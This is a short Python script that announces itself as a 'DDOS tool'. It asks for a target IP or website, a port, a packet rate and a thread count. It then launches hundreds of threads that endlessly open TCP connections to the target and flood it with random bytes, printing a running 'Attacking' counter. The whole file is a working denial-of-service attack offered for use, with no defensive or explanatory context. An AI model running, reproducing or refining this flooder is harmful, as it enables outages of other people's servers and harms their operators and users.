
import socket
import random
import threading

print("""
█▀▄ █▀█ █▀ ░░▄▀ █▀▄ █▀▄ █▀█ █▀
█▄▀ █▄█ ▄█ ▄▀░░ █▄▀ █▄▀ █▄█ ▄█
""")

print("by Moonbitzyt/Canasorngit")
print("DDOS tool")

print("---------------------------------------------------------")
ip = str(input('[+] Target IP/Website: '))
port = int(input('[+] Target PORT: '))
pack = int(input('[+] Packet/seconds [Over packet is 5000 (Dont recommend)]: '))
thread = int(input('[+] Threads [default 800]: '))


def start():
    hh = random._urandom(10)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print('MoonNetwork Attacking: '+ip+' | Sent: '+str(xx))
        except:
            s.close()

for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
